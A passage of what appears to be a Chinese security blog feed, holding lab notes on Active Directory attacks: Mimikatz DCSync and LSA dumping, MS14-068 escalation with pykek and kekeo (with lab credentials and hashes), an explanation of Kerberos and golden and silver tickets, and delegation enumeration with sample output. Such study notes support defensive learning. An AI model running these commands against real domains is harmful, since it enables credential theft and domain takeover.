DSGetNCChanges 复制用户凭据利用目录复制服务DRS远程协议            DCSync 选项：                /user - 要拉取数据的用户的 id 或 SID                /domain可选的 Active Directory 域的 FQDN 域名，Mimikatz 会发现域中的一个 DC 并去连接。如果不提供该参数，Mimikatz 会默认设置为当前域。                /dc可选的指定你想要使用 DCSync 连接并收集数据的域控制器。                另外还有一个/guid参数。                DCSync 命令行示例：                取 demo.local域中的 krbtgt / testwin7 / administrator 用户帐户的密码数据：                Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:demo.local /user:testwin7&quot; exit</code></pre><p>10.MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)<br>    允许域内任何一个普通用户，将自己提升至域管权限。<br>    作为普通用户向域控请求一个没有PAC的Kerberos TGT认证的票据，域控会返回一个TGT(不包含PAC，PAC通常包含有用户组中的成员关系)<br>    生成一个伪造的PAC，因为没有密钥，所以生成的PAC”被标记”有MD5算法，而不是带有域用户密码数据的HMAC_MD5类型。<br>    把伪造的PAC结合上TGT构造认证数据，作为TGS服务的一部分发送到域控。<br>    域控会混淆构造的数据，所以直接丢弃之前用户发送没带有PAC的TGT，然后新构造一个TGT并用自己的认证数据插入到伪造的PAC当中，再把新TGT发送给用户<br>    这样带有伪造PAC的TGT就能使用户成为有漏洞域控上的域管理员。</p><pre><code>1. mimikatz从域控上面抓取到所有账户信息    mimikatz # log    Using &#39;mimikatz.log&#39; for logfile : OK    mimikatz # privilege::debug    Privilege &#39;20&#39; OK    mimikatz # lsadump::lsa /inject    ......2. https://github.com/bidord/pykek    C:\pykek-master&gt;python ms14-068.py -u testwin7@demo.local -s S-1-5-21-1239069908-882060383-2558203358-1130 -d owa2010dc.demo.local  -p 1qaz$RFV --rc4 6df9f68e4b0656fa9ffd91d250506f8f    [+] Creating ccache file &#39;TGT_testwin7@demo.local.ccache&#39;... Done!]3. mimikatz # kerberos::ptc TGT_testwin7@demo.local.ccache (利用mimikatz注入高权限TGT的缓存证书)列举缓存证书的命令klist或者使用 kekeokerberos::purge or klist purge(为了让我们自己生成的票据生效，需要我们先用mimikatz将内存中的票据清空)kekeo.exe # exploit::ms14068 /domain:demo.local /user:testwin7 /password:1qaz$RFV /sid:S-1-5-21-1239069908-882060383-2558203358 /rid:1130 /kdc:owa2010dc.demo.local /ptt (接着使用域、普通域用户名和密码生成票据)http://www.mottoin.com/95877.html參考:    Attack Methods for Gaining Domain Admin Rights in Active Directory        http://adsecurity.org/?p=2362 (国内关于域的文章基本来自于这里 還有 http://www.harmj0y.net)    一种深度隐蔽的后门方式(二)        https://www.anquanke.com/post/id/93542    Mimikatz小实验:黄金票据+dcsync        http://www.freebuf.com/sectool/112594.html    域渗透之hash与票据        http://mp.weixin.qq.com/s/ENStRpYspx5W974BKPzZtA    域渗透——利用SYSVOL还原组策略中保存的密码        https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/    如何巧妙的从ntds.dit中提取Hash和域信息        http://www.freebuf.com/articles/system/151463.html    从活动目录中获取域管理员权限的6种方法        http://www.4hou.com/technology/4256.html    Kerberoasting - Part 3        https://room362.com/post/2016/kerberoast-pt3/    kekeo ticket 注入        https://www.anquanke.com/post/id/92484    kerberoasting-without-mimikatz        https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/        https://zhuanlan.zhihu.com/p/25723674 (翻譯)    Hash传递攻击登陆Windows2012远程桌面        http://www.freebuf.com/articles/system/15757.html</code></pre>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kerberos </tag>
            
            <tag> 笔记 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> hash注入 </tag>
            
            <tag> Golden Ticket </tag>
            
            <tag> NTDS.dit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kerberos认证相关</title>
      <link href="/2018/01/18/Kerberos%E8%AE%A4%E8%AF%81%E7%9B%B8%E5%85%B3/"/>
      <url>/2018/01/18/Kerberos%E8%AE%A4%E8%AF%81%E7%9B%B8%E5%85%B3/</url>
      <content type="html"><![CDATA[<a id="more"></a><h2 id="0x01-Kerberos认证过程-简易版"><a href="#0x01-Kerberos认证过程-简易版" class="headerlink" title="0x01 Kerberos认证过程 (简易版)"></a>0x01 Kerberos认证过程 (简易版)</h2><p>认证或请求服务 的过程如下:<br>simple.jpg</p><p><code>简义</code></p><p><code>KRB_AS_REQ (Kerberos Authentication Service Request)</code></p><ol><li>Client-A ———————————————————==&gt; KDC-AS (客户端执行散列运算加密一个时间戳,然后发送给身份验证服务(KDC-AS)) 此过程叫KRB_AS_REQ</li></ol><p><code>KRB_AS_REP (Kerberos Authentication Service Response)</code></p><ol><li>Client-A &lt;==——————————————————— KDC-AS (返回TGT,TGT票据使用KDC的krbtgt密钥进行加密) 此过程叫KRB_AS_REP</li></ol><p><code>KRB_TGS_REQ (Kerberos Ticket Granting Service Request)</code></p><ol><li>Client-A ———————————————————-==&gt; KDC-TGS (Client-A使用AS返回的”会话密钥”构建访问特定服务的请求,再把AS返回的”TGT”连同请求一起发送到票据授予服务TGS) 此过程叫KRB_TGS_REP</li></ol><p><code>KRB_TGS_REP (Kerberos Ticket Granting Service Response)</code></p><ol><li>Client-A &lt;==———————————————————- KDC-TGS (TGS解密TGT和服务请求,并向Client-A发送一个服务票据ST(Service Ticket)</li></ol><p><code>KRB_AP_REQ (Kerberos Application Request)</code></p><ol><li>Client-A ———————————————————-==&gt; Server-B (Client-A把服务票据中的服务器部分和请求一起发送到Server-B(Client-A要访问活动目录中的主机),远程服务器将直接接受该服务器票据,并不需要和KDC直接通信,因为该票据是用远程服务器和KDC共享的长期密钥加密过的)</li></ol><h2 id="0x02-Kerberos认证过程-详细版"><a href="#0x02-Kerberos认证过程-详细版" class="headerlink" title="0x02 Kerberos认证过程 (详细版)"></a>0x02 Kerberos认证过程 (详细版)</h2><p>Kerberos.jpg</p><p>认证或请求服务 的过程如下: </p><h4 id="1-Client-A-—-gt-KDC-AS"><a href="#1-Client-A-—-gt-KDC-AS" class="headerlink" title="1. Client-A —&gt; KDC-AS"></a>1. Client-A —&gt; KDC-AS</h4><pre><code>        KRB_AS_REQ (Kerberos Authentication Service Request) - 客户端执行散列运算加密一个时间戳,然后发送给身份验证服务(KDC-AS)    a. 客户端Client对用户口令执行散列运算转换为NTLM散列。此散列值(即用户密钥)成为客户端和KDC共享的长期密钥(long term key)。     b. KRB_AS_REQ (Kerberos Authentication Service Request) - 客户端执行散列运算加密一个时间戳,然后发送给身份验证服务(KDC-AS)。</code></pre><h4 id="2-Client-A-lt-—-KDC-AS"><a href="#2-Client-A-lt-—-KDC-AS" class="headerlink" title="2. Client-A &lt;— KDC-AS"></a>2. Client-A &lt;— KDC-AS</h4><pre><code>KRB_AS_REP (Kerberos Authentication Service Response) - 身份验证服务(KDC-AS)会解密时间戳,若解密成功(KDC-AS检查用户的信息(登录限制.组成员身份等)并创建票据授予票据(Ticket-Granting Ticket,TGT),并向本地LSA (Local Security Authority)请求生成一个特殊的数据PAC,表明了客户端获得某个特定用户的口令(即验证了用户的身份)。身份验证服务(KDC-AS)向客户端回复两条信息:     a. 短期会话密钥SessionKeya-kdc,用于客户端向KDC发起后续的请求 ,该消息经客户端的长期密钥(long term key)加密。(此短期会话密钥仅适用于该客户端和KDC之间)    b. 票据授予票据(Ticket Granting Ticket,简称TGT),包含有关用户名.域名.时间和组成员资格等信息。TGT票据使用KDC的krbtgt密钥进行加密,PAC使用krbtgt密钥进行进行签名,并且系统很少会验证PAC数据(在Windows环境中为krbtgt账户的NT-Hash)。</code></pre><h4 id="3-Client-A-—-gt-KDC-TGS"><a href="#3-Client-A-—-gt-KDC-TGS" class="headerlink" title="3. Client-A —&gt; KDC-TGS"></a>3. Client-A —&gt; KDC-TGS</h4><pre><code>KRB_TGS_REQ (Kerberos Ticket Granting Service Request) -Client使用AS返回的”短期会话密钥”构建访问特定服务的请求,再把AS返回的”票据授予票据(TGT)”连同请求一起发送到票据授予服务TGS) 此过程叫KRB_TGS_REQClient-A使用AS返回的会话密钥SessionKeya-kdc构建访问特定服务的请求。客户端Client再把请求连同TGT一起发送到票据授予服务TGS。(TGT是被KDC的krbtgt密钥加密的，所以Client-A无法解密)黄金票据 - 此过程3可以伪造TGT(前提是获取krbtgt账号的口令散列值)，宣称自己是域内任何账号，包括域管或者不存在的用户，这是黄金票据的原理。</code></pre><h4 id="4-Client-A-lt-—-KDC-TGS"><a href="#4-Client-A-lt-—-KDC-TGS" class="headerlink" title="4. Client-A &lt;— KDC-TGS"></a>4. Client-A &lt;— KDC-TGS</h4><pre><code>KRB_TGS_REP (Kerberos Ticket Granting Service Response) -票据授予服务TGS解密TGT和服务请求,然后如果请求被允许(KDC会打开票据,进行校验和检查。如果DC能够打开票据,并能通过校验和检查,那么会认为TGT为有效票据。此时TGT中的数据会被复制,以创建TGS票据ST),票据授予服务TGS向客户端Client发送一个服务票据(Service Ticket,简称ST),包括两个部分:     a. 远程服务器的部分 - 包含请求用户的组成员资格、时间戳、用于客户端和远程服务器之间通信的会话密钥。使用远程服务器Server-B和KDC共享的长期密钥(long term key)加密这部分消息。    b. 客户端的部分 - 包含用于客户端和远程服务器之间通信的会话密钥SessionKeya-b。(使用步骤2中AS回复的短期会话密钥(SessionKeya-kdc)加密这部分消息生成的会话密钥SessionKeya-b。)</code></pre><h4 id="5-Client-A-—-gt-Server-B"><a href="#5-Client-A-—-gt-Server-B" class="headerlink" title="5. Client-A —&gt; Server-B"></a>5. Client-A —&gt; Server-B</h4><pre><code>KRB_AP_REQ (Kerberos Application Request) - Client-A把服务票据(Service Ticket)中的服务器部分和请求一起发送到Server-B(用户要访问活动目录中的主机)。远程服务器将直接接受该服务器票据,并不需要和KDC直接通信,因为该票据是用远程服务器和KDC共享的长期密钥加密过的。解密成功(目标服务会使用自己的NTLM密码散列打开TGS票据,并提取用户的授权数据和会话密钥SessionKeya-b。)即表明KDC已经允许了此次通信。白银票据 - 此过程5可以伪造TGS(前提是获取服务账号的口令散列值)，宣称自己是域内任何账号，例如域管，这是白银票据的原理。</code></pre><h2 id="术语"><a href="#术语" class="headerlink" title="术语 :"></a>术语 :</h2><p><code>Kerberos</code>　: 　</p><pre><code>是Windows活动目录中使用的客户/服务器认证协议(windows中的认证协议有两种NTLM和Kerberos),为通信双方提供双向身份认证。相互认证或请求服务的实体被称为委托人(principal)。参与的中央服务器被称为密钥分发中心(简称KDC)。KDC(密钥分发中心　Key Distribution Center)有两个服务组成 :     1. AS 身份验证服务(Authentication Server)    2. TGS 票据授予服务(Ticket Granting Server)    该认证过程的实现不依赖于主机操作系统的认证,无需基于主机地址的信任,不要求网络上所有主机的物理安全,并假定网络上传送的数据包可以被任意地读取.修改和插入数据。    在以上情况下, Kerberos 作为一种可信任的第三方认证服务,是通过传统的密码技术(如:共享密钥)执行认证服务的。</code></pre><p><code>krbtgt账户</code><br>每个域控制器DC都有一个”krbtgt”的用户账户,是KDC的服务账户,用来创建票据授予服务(TGS)加密的密钥。</p><p><code>Principal　委托人</code>　</p><p>一个具有唯一标识的实体,可以是一台计算机或一项服务,通过使用KDC颁发的票据来进行通信。委托人可以分为两类: 用户和服务,分别具有不同种类的标识符。<br>Kerberos信任模型的核心是每个委托人(principal)和KDC的通信是在利用仅双方可知的密钥构建的安全通道中进行。<br>当委托人(principal)之间需要通信的时候,它们再使用KDC生成的会话密钥。</p><pre><code>1. 用户 (UPN)    用户通过如&quot;user@REALM&quot;格式的用户主体名称(User Principal Name,简称UPN)来标识。记住REALM一定是大写的。2. 服务 (SPN)    服务主体名称(Service Principal Name,简称SPN)是Kerberos身份验证服务(AS)所必需。    用于域中的服务和计算机账户。SPN的格式形如&quot;serviceclass/host_port/serviceName&quot;。    例如, 主机&quot;dc1.bhusa.com&quot;上LDAP服务的SPN可能类似于&quot;ldap/dc1.bhusa.com&quot;, &quot;ldap/dc1&quot;和&quot;ldap/dc1.bhusa.com/bhusa.com&quot;。    参考全限定主机名和仅主机名,一个服务可能注册为多个SPN。(同通常是执行DNS查询来规范化主机名称。这就解释了DNS为什么是微软Kerberos环境中的一个必要组件。查询服务的&quot;规范化&quot;名称,然后生成请求服务的SPN。)枚举域帐户的SPN :      GetUserSPNS.ps1 - https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1    Find-PSServiceAccounts.ps1 - https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts    PowerView 的 Get-NetUser -SPN - https://github.com/PowerShellMafia/PowerSploit/blob/5690b09027b53a5932e42399f6943e03fa32e549/Recon/PowerView.ps1#L2087-L2089getspn.png</code></pre><p><code>PAC (Privilege Access Certificate 特权访问证书)</code>: </p><p>KDC在向Kerberos客户端颁发TGT时,会向本地LSA (Local Security Authority)请求生成一个特殊的数据结构,名为”特权访问证书”<br>这个PAC包含为Kerberos客户端构建一个本地访问令牌所需的用户信息,<br>他同时使用域控制器服务器的私钥和KDC服务器的私钥来进行数字签署,以防假的KDC伪造PAC。</p><pre><code>1. 用户的登入时间以及用户会话额到期时间2. 用户上一次设置密码的时间,以及允许他再次更改密码的时间3. 用户的经典登入名,domain\user4. 用户的显示名称5. 指派给用户账户的经典NT登入脚本的名称(如果有的话)6. 用户漫游配置文件的UNC路径7. 客户端主目录的UNC路径8. 用户的并发登入数9. 在颁发PAC的KDC处,自从上一次成功登入以来,所允许的不成功登入尝试次10. 用户的RID11. 用户的&quot;主要组&quot;的RID,只限在POSIX使用12. 在域中,将用户作为一个成员的组的数量,以及每个组的RID13. 适用于用户的已知SID14. 域的SID15. 资源域的SID除此之外,PAC中还嵌入了另一个名为&quot;用户账户控制&quot;的数据结构 如何得到powerview     Get-ComputerProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl    Get-UserProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fldsquery    dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=computer)(objectClass=computer))&quot; -attr cn operatingSystem distinguishedName useraccountcontrol msds-allowedtodelegateto    dsquery * -l -limit 0 -filter &quot;&amp;(!objectClass=computer)(servicePrincipalName=*)&quot; -attr serviceprincipalname name samaccountname memberof pwdlastset distinguishedname useraccountcontrol    dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=user)(objectClass=user))&quot; -attr cn distinguishedName useraccountcontrol msds-allowedtodelegateto</code></pre><p><code>LSA (Local Security Authority)</code> :</p><p>LSA管理本地安全策略、管理审计策略和设置、为用户生成包含SID和组权限关系的令牌。<br>LSA验证的过程: LSA通过访问本地SAM(Security Accounts Manager)数据库,可以完成本地用户的验证。<br>LSA的处理流程: </p><pre><code>1. LSA首先会把身份凭据交给SSPI,由该接口负责与Kerberos和NTLM服务沟通。2. SSPI不能确定用户是本地登录还是域账户进行域登录。所以他会先把身份认证请求传递到Kerberos SSP。3. Kerberos SSP会验证用户的登入目标是本地计算机还是域。如果是登录域,Kerberos SSP将继续处理。如果是本地计算机,即用户不是登录域,Kerberos SSP返回一个错误消息到SSPI,交回给GINA处理,使服务器登录不可用。4. SSPI现在发送请求到下一个安全提供程序——NTLM。NTLM SSP会将请求交给Netlogon服务针对LSAM (Local Security Account Manager,本地安全账户管理器)数据库进行身份认证。使用NTLM SSP的身份认证过程与Windows NT系统的身份认证方法是相同的。</code></pre><p><code>相关</code>: </p><pre><code>1. krbtgt 密码:     它是整个活动目录中唯一的不会自动更新的密码。    除非:    第一种情况: 域功能级别(domain functional level,简称DFL)从NT5(2000/2003)升级到NT6(2008/2012)。    第二种情况: 利用域的恢复数据来实施域的裸机恢复(bare metal recovery)。2. Kerberos智能卡进行身份认证    Kerberos也允许使用PKI和智能卡进行身份认证。用户会被提示输入一个智能卡的PIN码,而不是口令。    Windows使用PIN码来访问智能卡上的公钥证书(public key certification)。利用智能卡的私钥签名该证书,并发送到KDC。    KDC验证证书上的签名是否源于可信实体。然后KDC发送公钥证书加密过的TGT。既然信息只能被智能卡的私钥解密,用户也就通过了域的身份认证。    然而,对于使用智能卡进行身份认证的账户来说,密码的散列值仍然存储在域控服务器上。此外,智能卡只能对&quot;交互式会话(interactive sessions)&quot;提供保护。    也就意味着智能卡认证仅能用于登录域中的计算机。</code></pre><p>參考:<br>    深入解读MS14-068漏洞:微软精心策划的后门?<br>        <a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/56081.html</a><br>    敞开的地狱之门:Kerberos协议的滥用<br>        <a href="http://www.freebuf.com/articles/system/45631.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/45631.html</a><br>    你所不知道的Kerberos 整理笔记(三)<br>        <a href="http://www.voidcn.com/article/p-nnpovuml-ng.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-nnpovuml-ng.html</a></p>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KDC </tag>
            
            <tag> Kerberos </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>利用域委派获取域某些权限</title>
      <link href="/2018/01/13/%E5%88%A9%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%9F%90%E4%BA%9B%E6%9D%83%E9%99%90/"/>
      <url>/2018/01/13/%E5%88%A9%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%9F%90%E4%BA%9B%E6%9D%83%E9%99%90/</url>
      <content type="html"><![CDATA[<a id="more"></a><p>WIN10-NEW$ ： 192.168.19.8    加入域 DEMO.LOCAL<br>owa2010dc$   ： 192.168.19.10    域服務器：DEMO.LOCAL<br>    testwin10 : 域用戶</p><p>0x01 域委派<br>    将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p><p>域内委派主要有3种应用方式：<br>一. 非约束性委派（Unconstrained Delegation ）<br>    服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户访问任意服务。<br>    举例说明，如果某个服务A的服务账号B被设置为非约束委派，当用户C通过Kerberos认证访问服务A时，KDC会检查服务账号B的属性，发现是非约束性委派时，KDC会将用户C的TGT放在TGS中，这样B在验证TGS的同时获取了A用户的TGT，从而可以模拟用户A访问任意服务。<br>    从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。</p><p>二. 约束性委派（Constrained Delegation）<br>    即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务；</p><p>三. 协议传递<br>    即Kerberos的扩展协议S4U2Self，服务账号针对某一个特定服务，可查询获取任意用户的TGS，从而能模拟任意用户访问该特定服务。</p><p>在Windows系统中，普通用户的属性中没有委派（Delegation）这个选项卡，只有服务账号、主机账号才有<br>WIN10-NEW$ ： 192.168.19.8        加入域 DEMO.LOCAL<br>owa2010dc$   ： 192.168.19.10    域服務器：DEMO.LOCAL<br>    testwin10 : 域用戶</p><p>在域DEMO.LOCAL上设置WIN10-NEW$的delegation(在Service Manager -&gt; Roles -&gt; demo.local的computers里找到WIN10-NEW$右键设置)，<br>    –&gt; Trust the computer for delegation to specified service only<br>        –&gt; Use any authentication protocol<br>            –&gt; 点击add -&gt; 点击find now<br>                –&gt; owa2010dc(域机器名) -&gt;ok-&gt;ok<br>                    –&gt; 选取cifs协议(共享)<br>                    delegation.png</p><p>查询服务账户(或者机器账号)的域委派权限方法<br>ldifde -f “C:\windows\temp\ld.temp” -s owa2010dc -d “dc=demo,dc=local” -p subtree -r “(&amp;(objectClass=User))” -l “*”<br>ldifde -f “C:\windows\temp\ld.temp” -s owa2010dc -d “dc=demo,dc=local” -p subtree -r “(&amp;(objectClass=User))” -l “cn,givenName,displayname,samAccountName,mail,department,title,description,scriptPath”<br>因爲ldifde導出的WIN10-NEW机器账号：<br>    ==&gt; userAccountControl: 16781312<br>WORKSTATION_TRUST_ACCOUNT : 4096<br>TRUSTED_FOR_DELEGATION : 16777216<br>    ==&gt; 16777216 + 4096 = 16781312<br>    根據<a href="https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx</a>  符合規則。<br>    属性标志 十进制<br>    SCRIPT                                  = 1,        // 0x1<br>    ACCOUNTDISABLE                          = 2,        // 0x2<br>    HOMEDIR_REQUIRED                        = 8,        // 0x8<br>    LOCKOUT                                 = 16,       // 0x10<br>    PASSWD_NOTREQD                          = 32,       // 0x20<br>    PASSWD_CANT_CHANGE                      = 64,       // 0x40<br>    ENCRYPTED_TEXT_PASSWORD_ALLOWED         = 128,      // 0x80<br>    TEMP_DUPLICATE_ACCOUNT                  = 256,      // 0x100<br>    NORMAL_ACCOUNT                          = 512,      // 0x200<br>    INTERDOMAIN_TRUST_ACCOUNT               = 2048,     // 0x800<br>    WORKSTATION_TRUST_ACCOUNT               = 4096,     // 0x1000<br>    SERVER_TRUST_ACCOUNT                    = 8192,     // 0x2000<br>    DONT_EXPIRE_PASSWD                      = 65536,    // 0x10000<br>    MNS_LOGON_ACCOUNT                       = 131072,   // 0x20000<br>    SMARTCARD_REQUIRED                      = 262144,   // 0x40000<br>    TRUSTED_FOR_DELEGATION                  = 524288,   // 0x80000<br>    NOT_DELEGATED                           = 1048576,  // 0x100000<br>    USE_DES_KEY_ONLY                        = 2097152,  // 0x200000<br>    DONT_REQUIRE_PREAUTH                    = 4194304,  // 0x400000<br>    PASSWORD_EXPIRED                        = 8388608,  // 0x800000<br>    TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION  = 16777216 // 0x1000000</p><p>或者PowerView的Get-DomainComputer(<a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a>  ) ：<br>通过PowerShell脚本枚举域内所有的机器账号，查看哪些账号被设置了委派，以及是何种类型的委派设置(获取机器的某些信息 包括useraccountcontrol,msds-allowedtodelegatetol)：<br>PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-ComputerProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl<br>distinguishedname        : CN=OWA2010DC,OU=Domain Controllers,DC=demo,DC=local<br>msds-allowedtodelegateto :<br>name                     : OWA2010DC<br>useraccountcontrol       : 532480</p><p>distinguishedname        : CN=OWA2010,CN=Computers,DC=demo,DC=local<br>msds-allowedtodelegateto :<br>name                     : OWA2010<br>useraccountcontrol       : 4096</p><p>distinguishedname        : CN=WIN10-NEW,CN=Computers,DC=demo,DC=local<br>msds-allowedtodelegateto : {cifs/OWA2010DC.demo.local/demo.local, cifs/OWA2010DC.demo.local, cifs/OWA2010DC, cifs/OWA20<br>                           10DC.demo.local/DEMO…}<br>name                     : WIN10-NEW<br>useraccountcontrol       : 16781312<br>computerproperty.png</p><p>或者PowerView的Get-UserProperty(通过PowerShell脚本枚举域内所有的用戶账号)：<br>PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-UserProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl<br>name                     : Administrator<br>distinguishedname        : CN=Administrator,CN=Users,DC=demo,DC=local<br>useraccountcontrol       : 66048<br>msds-allowedtodelegateto :</p><p>name                     : Guest<br>distinguishedname        : CN=Guest,CN=Users,DC=demo,DC=local<br>useraccountcontrol       : 66082<br>msds-allowedtodelegateto :</p><p>name                     : krbtgt<br>distinguishedname        : CN=krbtgt,CN=Users,DC=demo,DC=local<br>useraccountcontrol       : 514<br>msds-allowedtodelegateto :</p><p>name                     : testwin10<br>distinguishedname        : CN=testwin10,CN=Users,DC=demo,DC=local<br>useraccountcontrol       : 524800<br>msds-allowedtodelegateto :</p><p>或者 (获取机器的所有SPN信息 包括useraccountcontrol,msds-allowedtodelegateto)<br>C:\Users\Administrator&gt;dsquery <em> -l -limit 0 -filter “&amp;(!objectClass=computer)(servicePrincipalName=</em>)” -attr serviceprincipalname name samaccountname memberof pwdlastset distinguishedname useraccountcontrol<br>serviceprincipalname: kadmin/changepw<br>name: krbtgt<br>samaccountname: krbtgt<br>memberof: CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local<br>pwdlastset: 131182114793700226<br>distinguishedname: CN=krbtgt,CN=Users,DC=demo,DC=local<br>useraccountcontrol: 514<br>serviceprincipalname: test/test<br>name: testwin10<br>samaccountname: testwin10<br>memberof:<br>pwdlastset: 131602140228263620<br>distinguishedname: CN=testwin10,CN=Users,DC=demo,DC=local<br>useraccountcontrol: 524800</p><p>或者 PowerShell脚本枚举域帐户的SPN</p><ol><li>GetUserSPNs - kerberoast<br><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a><br>PS C:\Users\Administrator\Desktop\kerberoast&gt; . .\GetUserSPNs.ps1<br>ServicePrincipalName : kadmin/changepw<br>Name                 : krbtgt<br>SAMAccountName       : krbtgt<br>MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local<br>PasswordLastSet      : 9/13/2016 11:37:59 AM</li></ol><p>ServicePrincipalName : test/test<br>Name                 : testwin10<br>SAMAccountName       : testwin10<br>MemberOf             :<br>PasswordLastSet      : 1/12/2018 3:00:22 PM</p><ol><li>Get-NetUser - PowerView<br>PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-NetUser -spn<br>objectsid              : S-1-5-21-1239069908-882060383-2558203358-502<br>iscriticalsystemobject : True<br>samaccounttype         : 805306368<br>primarygroupid         : 513<br>instancetype           : 4<br>badpasswordtime        : 1/1/1601 8:00:00 AM<br>lastlogoff             : 1/1/1601 8:00:00 AM<br>whenchanged            : 1/12/2018 6:32:42 AM<br>badpwdcount            : 0<br>useraccountcontrol     : 514<br>usncreated             : 12324<br>countrycode            : 0<br>admincount             : 1<br>objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local<br>objectclass            : {top, person, organizationalPerson, user}<br>logoncount             : 0<br>lastlogon              : 1/1/1601 8:00:00 AM<br>serviceprincipalname   : kadmin/changepw<br>adspath                : LDAP://CN=krbtgt,CN=Users,DC=demo,DC=local<br>dscorepropagationdata  : {1/12/2018 6:32:42 AM, 9/13/2016 4:06:37 AM, 9/13/2016 3:53:08 AM, 1/1/1601 12:00:00 AM}<br>distinguishedname      : CN=krbtgt,CN=Users,DC=demo,DC=local<br>cn                     : krbtgt<br>pwdlastset             : 9/13/2016 11:37:59 AM<br>objectguid             : 547b1f4b-4f25-4a4f-96e9-2480d6f2e896<br>whencreated            : 9/13/2016 3:37:59 AM<br>description            : Key Distribution Center Service Account<br>samaccountname         : krbtgt<br>showinadvancedviewonly : True<br>memberof               : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local<br>accountexpires         : 9223372036854775807<br>usnchanged             : 28705<br>name                   : krbtgt<br>codepage               : 0</li></ol><p>objectsid             : S-1-5-21-1239069908-882060383-2558203358-1126<br>samaccounttype        : 805306368<br>primarygroupid        : 513<br>instancetype          : 4<br>badpasswordtime       : 1/17/2018 8:47:37 PM<br>accountexpires        : 0<br>whenchanged           : 1/13/2018 3:43:54 AM<br>badpwdcount           : 0<br>useraccountcontrol    : 524800<br>name                  : testwin10<br>codepage              : 0<br>objectclass           : {top, person, organizationalPerson, user}<br>logoncount            : 23<br>lastlogon             : 1/18/2018 7:37:12 AM<br>serviceprincipalname  : test/test<br>usncreated            : 32796<br>dscorepropagationdata : {1/13/2018 3:43:54 AM, 1/1/1601 12:00:00 AM}<br>distinguishedname     : CN=testwin10,CN=Users,DC=demo,DC=local<br>cn                    : testwin10<br>pwdlastset            : 1/12/2018 3:00:22 PM<br>objectguid            : 2d8ce475-2bd9-4827-a3ed-6e8b4695d516<br>whencreated           : 1/12/2018 7:00:22 AM<br>samaccountname        : testwin10<br>countrycode           : 0<br>objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local<br>adspath               : LDAP://CN=testwin10,CN=Users,DC=demo,DC=local<br>usnchanged            : 33123<br>lastlogoff            : 1/1/1601 8:00:00 AM<br>lastlogontimestamp    : 1/12/2018 3:00:40 PM</p><p>或者 (使用dsquery获取机器的某些信息 包括useraccountcontrol,msds-allowedtodelegateto)<br>C:\Users\Administrator&gt;dsquery * -limit 0 -filter “(&amp;(objectCategory=computer)(objectClass=computer))” -attr cn operatingSystem distinguishedName useraccountcontrol msds-allowedtodelegateto<br>  cn           operatingSystem                      distinguishedName                                      useraccountcontrol    msds-allowedtodelegateto<br>  OWA2010DC    Windows Server 2008 R2 Datacenter    CN=OWA2010DC,OU=Domain Controllers,DC=demo,DC=local    532480<br>  OWA2010      Windows Server 2008 R2 Datacenter    CN=OWA2010,CN=Computers,DC=demo,DC=local               4096<br>  WIN10-NEW    Windows 10 Enterprise 2016 LTSB      CN=WIN10-NEW,CN=Computers,DC=demo,DC=local             16781312              cifs/OWA2010DC.demo.local/demo.local;cifs/OWA2010DC.demo.local;cifs/OWA2010DC;cifs/OWA2010DC.demo.local/DEMO;cifs/OWA2010DC/DEMO;</p><p>或者 (获取用戶某些信息 包括useraccountcontrol)<br>C:\Users\Administrator&gt;dsquery * 